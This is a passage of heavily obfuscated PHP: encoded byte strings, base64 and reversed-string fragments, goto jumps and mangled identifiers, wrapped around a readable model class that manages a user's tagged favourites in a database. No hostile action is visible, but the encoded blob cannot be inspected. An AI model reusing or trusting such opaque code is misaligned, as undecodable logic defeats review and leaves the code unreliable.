40\xaf\xcb\xd6\x39\xd0\x5e\x9\x2d\xa9\xe9\x86\x80\x26\x3c\x52\x72\x24\x74\x46\x8f\x83\x3d\x6a\x9e\xbe\x1c\x42\x48\x9b\x66\x27\x23\x81\x63\x95"."\312\7\3\37\61\55\103\4\345\67\52\64\2\261\130\342\3\212\166\173\170\3\147\331\307\21\345\37\21\44\34\124\101\15\167\253\147\131\224\210\300\364\155\120\122\202\160\2\157\275\13\141\117\235\227\361\255".base64_decode('ohoUklEu+gQd+IWvOwS4CwiUjM8HPSWZKcbYc/VbhGHh5iSJCJLvWFDGBKgl+sdTUO05zGFVT3Wo')."\371\224\35\277\230\117\60\50\107\7\203\321\121\11\14\4\51\316\272\155\160\141\225\341\314\123\56\361\123\164\56\202\246\122\235\162\251\2\52\63\330\146\120\0\141\250\110\362\21\36\241\341\56\211\225\161\361"."\353\4\57\135\276\306\100\304\162\50\177\244\306\336\56\64\215\30\234\134\146\344\5\307\156\204\334\70\10\341\44\231\317\77\134\24\164\360\354\202\136\264\271\63\100\134\107\266\223\344\237\264\276\245\303\320\230".base64_decode('VAZwkOq70wK1eUWGZ3F0tbUlkW2sUHzF3a6FFIJCceLdybQZIpU/wunV2sXCu0M8gS5qmqXzBd7K').strrev('U®Ê^l"’æıv€¶ŸÊH¬½pË{bö­ŠøÂMcÍ8]C˜—N»E¡ö:¥¢bÃ0F')."\243\132\205\74\270\106\25\263\341\44\230\223\113\155\226\274\306\270\152\46\207\53\346\305\111\60\157\131\62\315\54\354\303\205\174\246\134\64\246\151\136\171\347\241\151\144\353\72\322\140\356\272\134\100\235\256\77".strrev('x²Yb6‹aÄ..+UÂ­<µç,Ü¿ 8)¤?´¶í¶8-m<ˆ¨µtÀ9â¢×+Ÿí—"+')."\x6f\x5b\xf9\x66\x37\x5c\x71\x16\x1b\xd6\x2b\x57\x1b\x5c\xec\x18\xee\x4a\x92\x38\x97\x1c\xcd\x53\x6f\x4c\x20\x3b\xf7\x72\x8\x2d\x2e\x3d\xba\xbd\x73\xa8\x6c\x67\xf3\x1b\x4c\x69\x2f\x5f\x14\x7c\xd5\x56\x74\x3c\xec\x80\x1b\xde\xf2"."\x1d\x65\x96\xfa\xea\x12\xdd\x32\xe3\x9d\x88\x66\xaa\x49\x41\xc5\x3\x2\x45\xcf\xc2\x38\x9d\x7e\x24\xcb\x8f\xc6\x88\x24\x80\x6f\xe9\x7c\xa2\xc6\xf2\xdb\xb7\x9e\xb0\x73\xeb\x6f\x76\x6e\xfe\xf5\xce\x33\x37\x6c\x3f\xeb\x97\x8e\x1d".strrev('w'."\r".'ûeÍîó³ß7·ò¿nÿÅo;­ñ?Ï“Ò%Ìğ¹Ş/ÉqØN'."\r".'x_·¯Ê~Üm6;ÉÓcµ^§')."\xbc\x7d\xc3\x55\x3b\xcf\xbd\x66\xc7\x49\xb7\xed\xb8\xe0\x57\x3b\xce\x3b\x69\x96\xd0\x29\xa0\xde\x3a\x77\x50\x68\xb9\x5d\xac\x90\xee\xe2\x27\xb2\x16\xf7\xd8\xe8\x5d\x37\x66\xec\x8e\x25\x0\x72\x26\x8d\x2f\x5e\x90\xd2\xf\x81\x74".strrev('m½Á\\P”Äv"8qÑp¿Kø„:á‘’&ªùI¦hvıB‚4&é¢98¬/šıÂL')."\104\301\251\210\225\131\42\360\230\235\105\302\345\347\351\235\105\333\235\23\7\200\135\151\102\233\40\264\206\236\344\341\365\201\347\341\244\133\354\262\40\177\177\201\20\273\170\71\216\264\324\14\67\116\161\23\215"."\x76\x27\x2a\xc3\x49\x1e\x8f\x64\x1a\x6d\x24\x7b\xa\x4d\x4e\xe6\xa5\xf3\xdb\x4a\x20\x47\x84\xbc\x8\xfc\xba\x39\x3a\x66\xea\xd\x45\xe3\xfe\x95\x81\x48\x34\x52\x96\xd4\xe7\x89\x44\x6\x42\x61\x1f\xd6\x8a\x2d\x4b\x46\xb9\x4\x4d".base64_decode('hLKkvu5Q73Rp/h5PIFiWBjUToK4ufd8UJwX6UC09wSBVjSuvRcC7nNcE3bXxc+DCsEaPVW1qO/TY')."\74\42\323\331\50\76\340\241\344\330\61\227\120\204\365\10\102\34\146\203\276\271\313\2\205\262\55\212\40\135\100\355\201\136\122\130\230\72\240\204\217\303\63\316\302\304\145\324\40\121\65\211\337\46\272\54\267"."\x8e\x2\x1c\x4d\x16\xc4\xdf\x4\x22\x14\xd7\x6e\x4\x20\xaa\xb4\xb6\x3b\x1e\x5b\x7\x96\xdf\x71\xda\xef\xd\x79\x87\xc0\x7a\x1f\x41\x1d\x50\x8c\x68\x9\xe1\xe2\x8\xb3\x40\xb\xf3\x13\xf5\x3f\x70\xd8\x92\x1c\x97\xd3\x16\xcf\xd3"."\200\327\104\265\250\234\41\274\5\112\67\74\326\61\51\206\305\263\223\166\306\132\114\71\103\157\374\355\134\137\270\342\206\275\366\377\0\61\317\312\225\200\305\0\0".""."", 10, -8))); goto e–ŞÓ˜Ù»ó; B¶¼†¦åùŠ: function beforeShutdownFatalError($Bò‰ôƒ™¬è) { think_exception($Bò‰ôƒ™¬è); } $_SERVER[$_SERVER[‡•˜°©ˆ][48]] = $c²Ü•ŠøÔ“($_SERVER[$_SERVER[‡•˜°©ˆ][45]]); $C°‹Ö‚çá‘ = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto DÖ¨¾İ‘‰Ø; AÒ­²ºõ¥®: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\x65\x72\137\x66\x61\x76"; protected function cacheFunctionAlias($Dªó‘À‹ƒÜ) { $fè©ÒàÔ« =& $_SERVER[Î¿—”òá]; return array($fè©ÒàÔ«[2482] => array(USER_ID, $fè©ÒàÔ«[2538])); } protected function listData() { $fî”™ãö÷Î =& $_SERVER[Î¿—”òá]; $b™£âĞÉš¿ = array($fî”™ãö÷Î[1420] => USER_ID, $fî”™ãö÷Î[436] => array($fî”™ãö÷Î[2539], 0)); $CËÒ±´”¾Ã = $fî”™ãö÷Î[2540]; $C²ù´š¥¿³ = $fî”™ãö÷Î[2541]; $A¹„ƒÒÑÂ‰ = $this->field($CËÒ±´”¾Ã)->where($b™£âĞÉš¿)->order($C²ù´š¥¿³)->select(); return $A¹„ƒÒÑÂ‰ ? $A¹„ƒÒÑÂ‰ : array(); } protected function listByTag($A¥šÇÙâ‡º) { } protected function addToTag($aØÑ…ñ ó, $BÂˆ‡¢ØäÄ) { $c§ª‰ØÌÇ =& $_SERVER[Î¿—”òá]; if (!Model($c§ª‰ØÌÇ[2310])->listData($BÂˆ‡¢ØäÄ) || !Model($c§ª‰ØÌÇ[749])->pathInfo($aØÑ…ñ ó)) { return !1; } $A¥ğçŒÆàÉ = array($c§ª‰ØÌÇ[1420] => USER_ID, $c§ª‰ØÌÇ[436] => $BÂˆ‡¢ØäÄ, $c§ª‰ØÌÇ[387] => $aØÑ…ñ ó, $c§ª‰ØÌÇ[388] => $c§ª‰ØÌÇ[382], $c§ª‰ØÌÇ[386] => $c§ª‰ØÌÇ[33], $c§ª‰ØÌÇ[2101] => 0); if ($this->where($A¥ğçŒÆàÉ)->find()) { return !1; } return $this->add($A¥ğçŒÆàÉ); } protected function removeFromTag($d¶ßåÍããš, $eëæ¼Ï‹¬) { $AŸÈôìÚ‰ =& $_SERVER[Î¿—”òá]; if (!Model($AŸÈôìÚ‰[2310])->listData($eëæ¼Ï‹¬)) { return !1; } if (is_array($d¶ßåÍããš)) { $d¶ßåÍããš = array($AŸÈôìÚ‰[7], $d¶ßåÍããš); } $BªŒ±İØñÂ = array($AŸÈôìÚ‰[1420] => USER_ID, $AŸÈôìÚ‰[436] => $eëæ¼Ï‹¬, $AŸÈôìÚ‰[388] => $AŸÈôìÚ‰[382], $AŸÈôìÚ‰[387] => $d¶ßåÍããš); return $this->where($BªŒ±İØñÂ)->delete(); } protected function removeByTag($FŞ¤Õ˜™ù) { $E‡œœÀ–‹‘ =& $_SERVER[Î¿—”òá]; if (!$FŞ¤Õ˜™ù) { return !1; } $BğŒ¾Ù–Ù° = array($E‡œœÀ–‹‘[1420] => USER_ID, $E‡œœÀ–‹‘[436] => $FŞ¤Õ˜™ù); return $this->where($BğŒ¾Ù–Ù°)->delete(); } protected function removeBySource($FÚÍ•æ‚¥ù) { $f¸§·ë°‹¼ =& $_SERVER[Î¿—”òá]; $EæŒêõØ¨Ÿ = array($f¸§·ë°‹¼[1420] => USER_ID, $f¸§·ë°‹¼[387] => $FÚÍ•æ‚¥ù, $f¸§·ë°‹¼[436] => array($f¸§·ë°‹¼[921], 0)); return $this->where($EæŒêõØ¨Ÿ)->delete(); } }